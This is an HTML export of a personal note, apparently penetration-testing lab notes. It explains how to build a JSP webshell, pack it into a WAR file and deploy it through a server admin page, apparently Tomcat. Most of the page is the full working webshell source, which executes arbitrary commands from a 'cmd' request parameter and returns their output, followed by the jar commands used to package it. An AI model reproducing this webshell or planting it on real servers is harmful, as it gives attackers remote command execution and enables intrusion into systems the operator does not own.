<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title> Build webshell with jsp</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'> Build webshell with jsp</h1><br/><strong><h2>Build a Webshell</h2></strong><br />we are going to see how we can build a Webshell to gain command execution on the server. <br />The Webshell will be a <strong>.jsp</strong> file packaged in a <strong>.war</strong> file:<br />• a <strong>jsp</strong> (Java Server Pages) file for dynamically generated web pages based on HTML, XML, SOAP... <span style="text-decoration:underline;">jsp</span> is similar to PHP and ASP, but uses Java.<br />• a <strong>war</strong>(Web application ARchive) file is a compressed package containing Java-based web components and applications that run on a web server.<br /><br />1. first we are going to build a <strong>jsp</strong> Webshell (index.jsp):<br />    <div class="codebox"><div class="codebox">&lt;FORM&nbsp;METHOD=GET&nbsp;ACTION=&#39;index.jsp&#39;&gt;<br />&lt;INPUT&nbsp;name=&#39;cmd&#39;&nbsp;type=text&gt;<br />&lt;INPUT&nbsp;type=submit&nbsp;value=&#39;Run&#39;&gt;<br />&lt;/FORM&gt;<br />&lt;%@&nbsp;page&nbsp;import=&quot;java.io.*&quot;&nbsp;%&gt;<br />&lt;%<br />&nbsp;&nbsp;&nbsp;String&nbsp;cmd&nbsp;=&nbsp;request.getParameter(&quot;cmd&quot;);<br />&nbsp;&nbsp;&nbsp;String&nbsp;output&nbsp;=&nbsp;&quot;&quot;;<br />&nbsp;&nbsp;&nbsp;if(cmd&nbsp;!=&nbsp;null)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;s&nbsp;=&nbsp;null;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process&nbsp;p&nbsp;=&nbsp;Runtime.getRuntime().exec(cmd,null,null);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BufferedReader&nbsp;sI&nbsp;=&nbsp;new&nbsp;BufferedReader(new<br />InputStreamReader(p.getInputStream()));<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while((s&nbsp;=&nbsp;sI.readLine())&nbsp;!=&nbsp;null)&nbsp;{&nbsp;output&nbsp;+=&nbsp;s+&quot;&lt;/br&gt;&quot;;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;catch(IOException&nbsp;e)&nbsp;{&nbsp;&nbsp;&nbsp;e.printStackTrace();&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;}<br />%&gt;<br />&lt;pre&gt;&lt;%=output&nbsp;%&gt;<span style="color:#000000;font-weight:400">&lt;</span>/pre<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />2. <span style="color:#495057;"> </span>now we have to create a directory name webshell and put the file (index.jsp) inside it:<br />    <div class="codebox"><div class="codebox">mkdir&nbsp;webshell<br />cp&nbsp;index.jsp&nbsp;webshell</div></div><br />3. build the <strong>war</strong> file using jar (provide with java):<br />    <div class="codebox"><div class="codebox">cd&nbsp;webshell<br />jar&nbsp;-cvf&nbsp;../webshell.war&nbsp;*</div></div><br /><br /><strong><h3>deploy the webshell created in the admin page</h3></strong><br /><a href="file://C:/CherryTree/screenshot/Black Boxes/webshell-tomcat.png"><img src="images/451-1.png" alt="images/451-1.png" /></a><br />after deployed we can find it here:<br /><a href="file://C:/CherryTree/screenshot/Black Boxes/webshell-tomcat2.png"><img src="images/451-2.png" alt="images/451-2.png" /></a><br />now if we append /webshell/index.jsp too the url we should have a full functional webshell:<br /><a href=""><img src="images/451-3.png" alt="images/451-3.png" /></a><br /><a href=""><img src="images/451-4.png" alt="images/451-4.png" /></a><br /></div>
</body>
</html>
